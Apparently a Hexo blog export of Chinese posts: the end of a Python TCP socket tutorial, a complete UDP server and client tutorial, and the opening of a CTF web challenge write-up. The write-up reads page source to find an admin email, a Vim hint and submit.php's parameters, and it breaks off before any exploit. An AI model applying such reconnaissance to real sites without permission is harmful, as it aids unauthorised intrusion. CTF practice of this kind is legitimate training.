<h3 id="send-函数"><a href="#send-函数" class="headerlink" title="send() 函数"></a>send() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket.send">send() 函数</a>用于向远程套接字对象发送数据。注意，本机套接字必须与远程套接字成功连接后才能使用该函数，否则会报错。可见，send() 函数只能用于 TCP 进程间通信，而对于 UDP 进程间通信应该用 sendto() 函数。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.send(<span class="built_in">bytes</span>[, flags])</span><br></pre></td></tr></table></figure>

<ul>
<li><em>bytes</em> 参数代表即将发送的 <a href="https://docs.python.org/3/library/stdtypes.html#bytes-objects">bytes 对象</a>数据。例如，对于字符串 <code>&quot;hello world!&quot;</code> 而言，需要用 encode() 函数转换为 bytes 对象 <code>b&quot;hello world!&quot;</code> 才能进行网络传输。</li>
<li><em>flags</em> 可选参数用于设置 send() 函数的特殊功能，默认值为 <em>0</em>，也可由一个或多个预定义值组成，用位或操作符 <code>|</code> 隔开。详情可参考 Unix 函数手册中的 <a href="https://linux.die.net/man/2/send">send(2)</a>，<em>flags</em> 参数的常见取值有 MSG_OOB、MSG_EOR 、MSG_DONTROUTE等。</li>
</ul>
<p>send() 函数的返回值是发送数据的字节数。</p>
<h3 id="recv-函数"><a href="#recv-函数" class="headerlink" title="recv() 函数"></a>recv() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket.recv">recv() 函数</a>用于从远程套接字对象接收数据。注意，与 send() 函数不同，recv() 函数既可用于 TCP 进程间通信，也能用于 UDP 进程间通信。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.recv(bufsize[, flags])</span><br></pre></td></tr></table></figure>

<ul>
<li><em>bufsize</em> 参数代表套接字可接收数据的最大字节数。注意，为了使硬件设备与网络传输更好地匹配，<em>bufsize</em> 参数的值最好设置为 2 的幂次方，例如 <em>4096</em>。</li>
<li><em>flags</em> 可选参数用于设置 recv() 函数的特殊功能，默认值为 <em>0</em>，也可由一个或多个预定义值组成，用位或操作符 <code>|</code> 隔开。详情可参考 Unix 函数手册中的 <a href="https://linux.die.net/man/2/recv">recv(2)</a>，<em>flags</em> 参数的常见取值有 MSG_OOB、MSG_PEEK、MSG_WAITALL 等。</li>
</ul>
<p>recv() 函数的返回值是接收到的 bytes 对象数据。例如，接收到 bytes 对象 <code>b&quot;hello world!&quot;</code>，最好用 decode() 函数转换为字符串 <code>&quot;hello world!&quot;</code> 再打印输出。</p>
<h3 id="close-函数"><a href="#close-函数" class="headerlink" title="close() 函数"></a>close() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket.close">close() 函数</a>用于关闭本地套接字对象，释放与该套接字连接的所有资源。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.close()</span><br></pre></td></tr></table></figure>

<h2 id="threading-模块"><a href="#threading-模块" class="headerlink" title="threading 模块"></a>threading 模块</h2><p>本节介绍上述代码中用到的<a href="https://docs.python.org/3/library/threading.html">内建模块 threading</a>，是 Python 多线程的核心模块。</p>
<h3 id="Thread-类"><a href="#Thread-类" class="headerlink" title="Thread() 类"></a>Thread() 类</h3><p><a href="https://docs.python.org/3/library/threading.html#threading.Thread">Thread() 类</a>可以创建线程对象，用于调用 start() 函数启动新线程。类原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">threading</span>.Thread(group=<span class="literal">None</span>, target=<span class="literal">None</span>, name=<span class="literal">None</span>, args=(), kwargs=&#123;&#125;, *, daemon=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><em>group</em> 参数作为以后实现 ThreadGroup() 类的保留参数，目前默认值为 <em>None</em>。</li>
<li><em>target</em> 参数代表线程被 run() 函数激活后调用的函数，默认值为 <em>None</em>，即没有任何函数会被调用。</li>
<li>name 参数代表线程名，默认值为 <em>None</em>，则系统会自动为其命名，格式为「Thread-<em>N</em>」，<em>N</em> 是从 <em>1</em> 开始的十进制数。</li>
<li><em>args</em> 参数代表 <em>target</em> 参数指向函数的普通参数，用元组（tuple）表示，默认值为空元组 <code>()</code>。</li>
<li><em>kwargs</em> 参数代表 <em>target</em> 参数指向函数的关键字参数，用字典（dict）表示，默认值为空字典 <code>&#123;&#125;</code>。</li>
<li><em>daemon</em> 参数用于标示进程是否为守护进程。若设置为 <em>True</em>，则标示为守护进程；若设置为 <em>False</em>，则标示为非守护进程；若设置为 <em>None</em>，则继承当前父线程的 <em>daemon</em> 参数值。</li>
</ul>
<p>创建完线程对象后，需使用对象的内置函数控制多线程活动。</p>
<h3 id="start-函数"><a href="#start-函数" class="headerlink" title="start() 函数"></a>start() 函数</h3><p><a href="https://docs.python.org/3/library/threading.html#threading.Thread.start">start() 函数</a>用于开启线程活动。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Thread.start()</span><br></pre></td></tr></table></figure>

<p>注意，每个线程对象只能调用一次 start() 函数，否则会导致 <a href="https://docs.python.org/3/library/exceptions.html#RuntimeError">RuntimeError</a> 错误。</p>
<h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h1><p>本文介绍了 TCP 协议与 socket 编程的基础知识，再用 Python 3 实现并演示了 TCP 服务器与客户端的通信过程，其中还运用了简单的多线程技术，最后将脚本中涉及到的 Python API 做成了的参考索引，有助于理解实现过程。</p>
<p>笔者水平有限，若文中出现不足或错误之处，还望大家不吝相告，多多包涵，欢迎读者前来交流技术，感谢阅读。</p>
<p>本文的相关参考请移步至：</p>
<blockquote>
<p><a href="https://blog.csdn.net/xingerr/article/details/72834303">TCP三次握手详解</a><br><a href="https://blog.csdn.net/xingerr/article/details/72845941">TCP四次挥手详解</a><br><a href="http://www.cnblogs.com/dolphinX/p/3460545.html">简单理解Socket</a><br><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432004374523e495f640612f4b08975398796939ec3c000">TCP编程 - 廖雪峰的官方网站</a><br><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143192823818768cd506abbc94eb5916192364506fa5d000">多线程 - 廖雪峰的官方网站</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Programming</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>Python</tag>
        <tag>API</tag>
        <tag>TCP</tag>
        <tag>Socket</tag>
        <tag>Server</tag>
        <tag>Client</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 绝技 —— UDP 服务器与客户端</title>
    <url>/2018/06/15/python-trick-udp-server-and-client/</url>
    <content><![CDATA[<style>
table th:nth-of-type(1) {
    width: 18%;
}
</style>

<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在上一篇文章<a href="https://ciphersaw.github.io/2018/05/23/Python%20%E7%BB%9D%E6%8A%80%20%E2%80%94%E2%80%94%20TCP%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF/">「Python 绝技 —— TCP 服务器与客户端」</a>中，介绍了传输层的核心协议 TCP ，并运用 Python 脚本的 socket 模块演示了 TCP 服务器与客户端的通信过程。</p>
<p>本篇将按照同样的套路，先介绍传输层的另一个<strong>核心协议 UDP</strong>，再比较 TCP 与 UDP 的特点，最后借助 Python 脚本演示 <strong>UDP 服务器与客户端</strong>的通信过程。</p>
<span id="more"></span>

<h1 id="0x01-UDP-协议"><a href="#0x01-UDP-协议" class="headerlink" title="0x01 UDP 协议"></a>0x01 UDP 协议</h1><p><a href="https://en.wikipedia.org/wiki/User_Datagram_Protocol">UDP（User Datagram Protocol，用户数据报协议）</a>是一种无连接、不可靠、基于数据报的传输层通信协议。</p>
<ul>
<li>UDP 的通信过程与 TCP 相比较为简单，不需要复杂的三次握手与四次挥手，体现了<strong>无连接</strong>；</li>
<li>UDP 传输速度比 TCP 快，但容易丢包、数据到达顺序无保证、缺乏拥塞控制、秉承尽最大努力交付的原则，体现了<strong>不可靠</strong>；</li>
<li>UDP 的无连接与不可靠特性注定无法采用字节流的通信模式，由协议名中的「Datagram」与 socket 类型中的「SOCK_DGRAM」即可体现它<strong>基于数据报</strong>的通信模式。</li>
</ul>
<p>为了更直观地比较 TCP 与 UDP 的异同，笔者将其整理成以下表格：</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center">TCP</th>
<th align="center">UDP</th>
</tr>
</thead>
<tbody><tr>
<td align="center">连接模式</td>
<td align="center">面向连接（单点通信）</td>
<td align="center">无连接（多点通信）</td>
</tr>
<tr>
<td align="center">传输可靠性</td>
<td align="center">可靠</td>
<td align="center">不可靠</td>
</tr>
<tr>
<td align="center">通信模式</td>
<td align="center">基于字节流</td>
<td align="center">基于数据报</td>
</tr>
<tr>
<td align="center">报头结构</td>
<td align="center">复杂（至少20字节）</td>
<td align="center">简单（8字节）</td>
</tr>
<tr>
<td align="center">传输速度</td>
<td align="center">慢</td>
<td align="center">快</td>
</tr>
<tr>
<td align="center">资源需求</td>
<td align="center">多</td>
<td align="center">少</td>
</tr>
<tr>
<td align="center">到达顺序</td>
<td align="center">保证</td>
<td align="center">不保证</td>
</tr>
<tr>
<td align="center">流量控制</td>
<td align="center">有</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">拥塞控制</td>
<td align="center">有</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">应用场合</td>
<td align="center">大量数据传输</td>
<td align="center">少量数据传输</td>
</tr>
<tr>
<td align="center">支持的应用层协议</td>
<td align="center">Telnet、FTP、SMTP、HTTP</td>
<td align="center">DNS、DHCP、TFTP、SNMP</td>
</tr>
</tbody></table>
<h1 id="0x02-Network-Socket"><a href="#0x02-Network-Socket" class="headerlink" title="0x02 Network Socket"></a>0x02 Network Socket</h1><p><a href="https://en.wikipedia.org/wiki/Network_socket"><strong>Network Socket（网络套接字）</strong></a>是计算机网络中进程间通信的数据流端点，广义上也代表操作系统提供的一种进程间通信机制。</p>
<p><a href="https://en.wikipedia.org/wiki/Inter-process_communication"><strong>进程间通信（Inter-Process Communication，IPC）</strong></a>的根本前提是<strong>能够唯一标示每个进程</strong>。在本地主机的进程间通信中，可以用 <strong><a href="https://en.wikipedia.org/wiki/Process_identifier">PID（进程 ID）</a><strong>唯一标示每个进程，但 PID 只在本地唯一，在网络中不同主机的 PID 则可能发生冲突，因此采用</strong>「IP 地址 + 传输层协议 + 端口号」</strong>的方式唯一标示网络中的一个进程。</p>
<blockquote>
<p>小贴士：网络层的 IP 地址可以唯一标示主机，传输层的 TCP&#x2F;UDP 协议和端口号可以唯一标示该主机的一个进程。注意，同一主机中 TCP 协议与 UDP 协议的可以使用相同的端口号。</p>
</blockquote>
<p>所有支持网络通信的编程语言都各自提供了一套 socket API，下面以 Python 3 为例，讲解服务器与客户端建立 UDP 通信连接的交互过程：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/python-trick-udp-server-and-client/udp-socket-python.png" alt="udp-socket-python"></p>
<p>可见，UDP 的通信过程比 TCP 简单许多，服务器少了监听与接受连接的过程，而客户端也少了请求连接的过程。客户端只需要知道服务器的地址，直接向其发送数据即可，而服务器也敞开大门，接收任何发往自家地址的数据。</p>
<blockquote>
<p>小贴士：由于 UDP 采用无连接模式，可知 UDP 服务器在接收到客户端发来的数据之前，是不知道客户端的地址的，因此<strong>必须是客户端先发送数据，服务器后响应数据</strong>。而 TCP 则不同，TCP 服务器接受了客户端的连接后，既可以先向客户端发送数据，也可以等待客户端发送数据后再响应。</p>
</blockquote>
<h1 id="0x03-UDP-服务器"><a href="#0x03-UDP-服务器" class="headerlink" title="0x03 UDP 服务器"></a>0x03 UDP 服务器</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.bind((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6000</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;UDP bound on port 6000...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	data, addr = s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Receive from %s:%s&quot;</span> % addr)</span><br><span class="line">	<span class="keyword">if</span> data == <span class="string">b&quot;exit&quot;</span>:</span><br><span class="line">		s.sendto(<span class="string">b&quot;Good bye!\n&quot;</span>, addr)</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	s.sendto(<span class="string">b&quot;Hello %s!\n&quot;</span> % data, addr)</span><br></pre></td></tr></table></figure>

<ul>
<li>Line 5：创建 socket 对象，第一个参数为 <em>socket.AF_INET</em>，代表采用 IPv4 协议用于网络通信，第二个参数为 <em>socket.SOCK_DGRAM</em>，代表采用 UDP 协议用于无连接的网络通信。</li>
<li>Line 6：向 socket 对象绑定服务器主机地址 (“127.0.0.1”, 6000)，即本地主机的 UDP 6000 端口。</li>
<li>Line 9：进入与客户端交互数据的循环阶段。</li>
<li>Line 10：接收客户端发来的数据，包括 bytes 对象 data，以及客户端的 IP 地址和端口号 addr，其中 addr 为二元组 (host, port)。</li>
<li>Line 11：打印接收信息，表示从地址为 addr 的客户端接收到数据。</li>
<li>Line 12：若 bytes 对象为 <code>b&quot;exit&quot;</code>，则向地址为 addr 的客户端发送结束响应信息 <code>b&quot;Good bye!\n&quot;</code>。发送完毕后，继续等待其他 UDP 客户端发来数据。</li>
<li>Line 15：若 bytes 对象不为 <code>b&quot;exit&quot;</code>，则向地址为 addr 的客户端发送问候响应信息 <code>b&quot;Hello %s!\n&quot;</code>，其中 <code>%s</code> 是客户端发来的 bytes 对象。发送完毕后，继续等待任意 UDP 客户端发来数据。</li>
</ul>
<p>与 TCP 服务器相比，UDP 服务器不必使用多线程，因为它<strong>无需为每个通信过程创建独立连接，而是采用「即收即发」的模式</strong>，又一次体现了 UDP 的无连接特性。</p>
<h1 id="0x04-UDP-客户端"><a href="#0x04-UDP-客户端" class="headerlink" title="0x04 UDP 客户端"></a>0x04 UDP 客户端</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">addr = (<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	data = <span class="built_in">input</span>(<span class="string">&quot;Please input your name: &quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	s.sendto(data.encode(), addr)</span><br><span class="line">	response, addr = s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">	<span class="built_in">print</span>(response.decode())</span><br><span class="line">	<span class="keyword">if</span> data == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Session is over from the server %s:%s\n&quot;</span> % addr)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>Line 5：创建 socket 对象，第一个参数为 <em>socket.AF_INET</em>，代表采用 IPv4 协议用于网络通信，第二个参数为 <em>socket.SOCK_DGRAM</em>，代表采用 UDP 协议用于无连接的网络通信。</li>
<li>Line 6：初始化 UDP 服务器的地址 (“127.0.0.1”, 6000)，即本地主机的 UDP 6000 端口。</li>
<li>Line 8：进入与服务器交互数据的循环阶段。</li>
<li>Line 9：要求用户输入名字。</li>
<li>Line 10：当用户的输入为空时，则重新开始循环，要求用户重新输入。</li>
<li>Line 12：当用户的输入非空时，则将字符串转换为 bytes 对象后，发送至地址为 (“127.0.0.1”, 6000) 的 UDP 服务器。</li>
<li>Line 13：接收服务器的响应数据，包括 bytes 对象 response，以及服务器的 IP 地址和端口号 addr，其中 addr 为二元组 (host, port)。</li>
<li>Line 14：将响应的 bytes 对象 response 转换为字符串后打印输出。</li>
<li>Line 15：当用户的输入为 <code>&quot;exit&quot;</code> 时，则打印会话结束信息，终止与服务器交互数据的循环阶段，即将关闭套接字。</li>
<li>Line 19：关闭套接字，不再向服务器发送数据。</li>
</ul>
<h1 id="0x05-UDP-进程间通信"><a href="#0x05-UDP-进程间通信" class="headerlink" title="0x05 UDP 进程间通信"></a>0x05 UDP 进程间通信</h1><p>将 UDP 服务器与客户端的脚本分别命名为 <code>udp_server.py</code> 与 <code>udp_client.py</code>，然后存至桌面，笔者将在 Windows 10 系统下用 PowerShell 进行演示。</p>
<blockquote>
<p>小贴士：读者进行复现时，要确保本机已安装 Python 3，注意笔者已将默认的启动路径名 <code>python</code> 改为了 <code>python3</code>。</p>
</blockquote>
<h2 id="单服务器-VS-多客户端"><a href="#单服务器-VS-多客户端" class="headerlink" title="单服务器 VS 多客户端"></a>单服务器 VS 多客户端</h2><p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/python-trick-udp-server-and-client/one-server-vs-multiple-clients.png" alt="one-server-vs-multiple-clients"></p>
<ol>
<li>在其中一个 PowerShell 中运行命令 <code>python3 ./udp_server.py</code>，服务器绑定本地主机的 UDP 6000 端口，并打印信息 <code>UDP bound on port 6000...</code>，等待客户端发来数据；</li>
<li>在另两个 PowerShell 中分别运行命令 <code>python3 ./udp_client.py</code>，并向服务器发送字符串 <code>Client1</code>、<code>Client2</code>；</li>
<li>服务器打印接收信息，表示分别从 UDP 63643、63644端口接收到数据，并分别向客户端发送问候响应信息；</li>
<li>客户端 <code>Client1</code> 发送空字符串，则被要求重新输入；</li>
<li>客户端 <code>Client2</code> 先发送字符串 <code>Alice</code>，得到服务器的问候响应信息，再发送字符串 <code>exit</code>，得到服务器的结束响应信息，最后打印会话结束信息，终止与服务器的数据交互；</li>
<li>客户端 <code>Client1</code> 发送字符串 <code>exit</code>，得到服务器的结束响应信息，并打印会话结束信息，终止与服务器的数据交互；</li>
<li>服务器按照以上客户端的数据发送顺序打印接收信息，并继续等待任意 UDP 客户端发来数据。</li>
</ol>
<h1 id="0x06-Python-API-Reference"><a href="#0x06-Python-API-Reference" class="headerlink" title="0x06 Python API Reference"></a>0x06 Python API Reference</h1><h2 id="socket-模块"><a href="#socket-模块" class="headerlink" title="socket 模块"></a>socket 模块</h2><p>本节介绍上述代码中用到的<a href="https://docs.python.org/3/library/socket.html">内建模块 socket</a>，是 Python 网络编程的核心模块。</p>
<h3 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket() 函数"></a>socket() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket">socket() 函数</a>用于创建网络通信中的套接字对象。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.socket(family=AF_INET, <span class="built_in">type</span>=SOCK_STREAM, proto=<span class="number">0</span>, fileno=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><em>family</em> 参数代表<a href="https://docs.python.org/3/library/socket.html#socket-families">地址族（Address Family）</a>，默认值为 <em>AF_INET</em>，用于 IPv4 网络通信，常用的还有 <em>AF_INET6</em>，用于 IPv6 网络通信。<em>family</em> 参数的可选值取决于本机操作系统。</li>
<li><em>type</em> 参数代表套接字的类型，默认值为 <em>SOCK_STREAM</em>，用于 TCP 协议（面向连接）的网络通信，常用的还有 <em>SOCK_DGRAM</em>，用于 UDP 协议（无连接）的网络通信。</li>
<li><em>proto</em> 参数代表套接字的协议，默认值为 <em>0</em>，一般忽略该参数，除非 <em>family</em> 参数为 <em>AF_CAN</em>，则 <em>proto</em> 参数需设置为 <em>CAN_RAW</em> 或 <em>CAN_BCM</em>。</li>
<li><em>fileno</em> 参数代表套接字的文件描述符，默认值为 <em>None</em>，若设置了该参数，则其他三个参数将会被忽略。</li>
</ul>
<p>创建完套接字对象后，需使用对象的内置函数完成网络通信过程。<strong>注意，以下函数原型中的「socket」是指 socket 对象，而不是上述的 socket 模块。</strong></p>
<h3 id="bind-函数"><a href="#bind-函数" class="headerlink" title="bind() 函数"></a>bind() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket.bind">bind() 函数</a>用于向套接字对象绑定 IP 地址与端口号。注意，套接字对象必须未被绑定，并且端口号未被占用，否则会报错。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.bind(address)</span><br></pre></td></tr></table></figure>

<ul>
<li><em>address</em> 参数代表套接字要绑定的地址，其格式取决于套接字的 <em>family</em> 参数。若 <em>family</em> 参数为 <em>AF_INET</em>，则 <em>address</em> 参数表示为二元组 (host, port)，其中 host 是用字符串表示的主机地址，port 是用整型表示的端口号。</li>
</ul>
<h3 id="sendto-函数"><a href="#sendto-函数" class="headerlink" title="sendto() 函数"></a>sendto() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket.sendto">sendto() 函数</a>用于向远程套接字对象发送数据。注意，该函数用于 UDP 进程间的无连接通信，远程套接字的地址在参数中指定，因此使用前不需要先与远程套接字连接。相对地，TCP 进程间面向连接的通信过程需要用 send() 函数。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.sendto(<span class="built_in">bytes</span>[, flags], address)</span><br></pre></td></tr></table></figure>

<ul>
<li><em>bytes</em> 参数代表即将发送的 <a href="https://docs.python.org/3/library/stdtypes.html#bytes-objects">bytes 对象</a>数据。例如，对于字符串 <code>&quot;hello world!&quot;</code> 而言，需要用 encode() 函数转换为 bytes 对象 <code>b&quot;hello world!&quot;</code> 才能进行网络传输。</li>
<li><em>flags</em> 可选参数用于设置 sendto() 函数的特殊功能，默认值为 <em>0</em>，也可由一个或多个预定义值组成，用位或操作符 <code>|</code> 隔开。详情可参考 Unix 函数手册中的 <a href="https://linux.die.net/man/2/sendto">sendto(2)</a>，<em>flags</em> 参数的常见取值有 MSG_OOB、MSG_EOR、MSG_DONTROUTE 等。</li>
<li><em>address</em> 参数代表远程套接字的地址，其格式取决于套接字的 <em>family</em> 参数。若 <em>family</em> 参数为 <em>AF_INET</em>，则 <em>address</em> 参数表示为二元组 (host, port)，其中 host 是用字符串表示的主机地址，port 是用整型表示的端口号。</li>
</ul>
<p>sendto() 函数的返回值是发送数据的字节数。</p>
<h3 id="recvfrom-函数"><a href="#recvfrom-函数" class="headerlink" title="recvfrom() 函数"></a>recvfrom() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket.recvfrom">recvfrom() 函数</a>用于从远程套接字对象接收数据。注意，与 sendto() 函数不同，recvfrom() 函数既可用于 UDP 进程间通信，也能用于 TCP 进程间通信。函数原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.recvfrom(bufsize[, flags])</span><br></pre></td></tr></table></figure>

<ul>
<li><em>bufsize</em> 参数代表套接字可接收数据的最大字节数。注意，为了使硬件设备与网络传输更好地匹配，<em>bufsize</em> 参数的值最好设置为 2 的幂次方，例如 <em>4096</em>。</li>
<li><em>flags</em> 可选参数用于设置 recv() 函数的特殊功能，默认值为 <em>0</em>，也可由一个或多个预定义值组成，用位或操作符 <code>|</code> 隔开。详情可参考 Unix 函数手册中的 <a href="https://linux.die.net/man/2/recvfrom">recvfrom(2)</a>，<em>flags</em> 参数的常见取值有 MSG_OOB、MSG_PEEK、MSG_WAITALL 等。</li>
</ul>
<p>recvfrom() 函数的返回值是二元组 (bytes, address)，其中 bytes 是接收到的 bytes 对象数据，address 是发送方的 IP 地址与端口号，用二元组 (host, port) 表示。注意，recv() 函数的返回值只有 bytes 对象数据。</p>
<h3 id="close-函数"><a href="#close-函数" class="headerlink" title="close() 函数"></a>close() 函数</h3><p><a href="https://docs.python.org/3/library/socket.html#socket.socket.close">close() 函数</a>用于关闭本地套接字对象，释放与该套接字连接的所有资源。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">socket.close()</span><br></pre></td></tr></table></figure>

<h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h1><p>本文介绍了 UDP 协议的基础知识，并与 TCP 协议进行对比，再用 Python 3 实现并演示了 UDP 服务器与客户端的通信过程，最后将脚本中涉及到的 Python API 做成了的参考索引，有助于读者理解实现过程。</p>
<p>感谢各位的阅读，笔者水平有限，若有不足或错误之处请谅解并告知，希望自己对 TCP 和 UDP 的浅薄理解，能帮助读者更好地理解传输层协议。</p>
<p>本文的相关参考请移步至：</p>
<blockquote>
<p><a href="https://blog.csdn.net/Li_Ning_/article/details/52117463">TCP和UDP的最完整的区别</a><br><a href="http://blog.51cto.com/feinibuke/340272">TCP和UDP之间的区别</a><br><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432004977916a212e2168e21449981ad65cd16e71201000">UDP编程 - 廖雪峰的官方网站</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Programming</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>Python</tag>
        <tag>API</tag>
        <tag>Socket</tag>
        <tag>Server</tag>
        <tag>Client</tag>
        <tag>UDP</tag>
      </tags>
  </entry>
  <entry>
    <title>【实验吧 CTF】 Web —— 忘记密码了</title>
    <url>/2017/09/28/shiyanbar-ctf-web-forgotten-password/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>此题是 Web 基础题，难度中低，需要的基础知识有：<strong>HTML、PHP、SQL、Linux、HTTP 协议</strong>。</p>
<p>共涉及三个页面，需要用到<strong>浏览器调试技巧和搜索技巧</strong>，还要有<strong>关键点发现意识</strong>，先附上链接。</p>
<ul>
<li>题目链接：<a href="http://www.shiyanbar.com/ctf/1808">http://www.shiyanbar.com/ctf/1808</a></li>
<li>解题链接：<a href="http://ctf5.shiyanbar.com/10/upload/step1.php">http://ctf5.shiyanbar.com/10/upload/step1.php</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/shiyanbar-ctf-web-forgotten-password/question.jpg" alt="question"></p>
<h1 id="0x01-先看看-step1-php"><a href="#0x01-先看看-step1-php" class="headerlink" title="0x01 先看看 step1.php"></a>0x01 先看看 step1.php</h1><p>看到一个输入框，随便填个 <a href="mailto:&#x72;&#x6f;&#111;&#x74;&#x40;&#x78;&#120;&#120;&#x2e;&#99;&#x6f;&#x6d;">&#x72;&#x6f;&#111;&#x74;&#x40;&#x78;&#120;&#120;&#x2e;&#99;&#x6f;&#x6d;</a> 试试反应，结果得到一个弹框，得到第二个页面 <strong>step2.php</strong>。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/shiyanbar-ctf-web-forgotten-password/step1.jpg" alt="step1"></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/shiyanbar-ctf-web-forgotten-password/alert.jpg" alt="alert"></p>
<h1 id="0x02-习惯性地翻源码"><a href="#0x02-习惯性地翻源码" class="headerlink" title="0x02 习惯性地翻源码"></a>0x02 习惯性地翻源码</h1><h2 id="从-step1-php-源码可以得到以下线索："><a href="#从-step1-php-源码可以得到以下线索：" class="headerlink" title="从 step1.php 源码可以得到以下线索："></a>从 step1.php 源码可以得到以下线索：</h2><ul>
<li>admin 的邮箱是 <a href="mailto:&#x61;&#100;&#109;&#x69;&#x6e;&#64;&#x73;&#x69;&#x6d;&#112;&#108;&#101;&#x78;&#117;&#101;&#46;&#99;&#x6f;&#109;">&#x61;&#100;&#109;&#x69;&#x6e;&#64;&#x73;&#x69;&#x6d;&#112;&#108;&#101;&#x78;&#117;&#101;&#46;&#99;&#x6f;&#109;</a></li>
<li>是用编辑器 Vim 编辑的</li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/shiyanbar-ctf-web-forgotten-password/step1-source.jpg" alt="step1-source"></p>
<h2 id="再看看-step2-php-源码可以发现："><a href="#再看看-step2-php-源码可以发现：" class="headerlink" title="再看看 step2.php 源码可以发现："></a>再看看 step2.php 源码可以发现：</h2><ul>
<li>怪不得马上跳转回 step1.php，原来有一句：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=refresh content=0.5;URL=&quot;./step1.php&quot;&gt;check error!</span><br></pre></td></tr></table></figure></li>
<li>跟 step1.php 同样存在关于 admin 和 editor 信息</li>
<li>代码下半部分惊奇地发现一个表单，并且得到第三个页面 <strong>submit.php</strong>，还知道需要通过 <strong>GET 方法</strong>向该页面发送两个参数 <strong>emailAddress</strong> 和 <strong>token</strong>。</li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/shiyanbar-ctf-web-forgotten-password/step2-source.jpg" alt="step2-source"></p>
<p>从以上线索看来只有一条路可走：<strong>找出正确的 emailAddress 和 token</strong> 发给 submit.php。<br>尝试随便发点东西给 submit.php，却得到无情的拒绝:(</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/shiyanbar-ctf-web-forgotten-password/refuse.jpg" alt="refuse"></p>
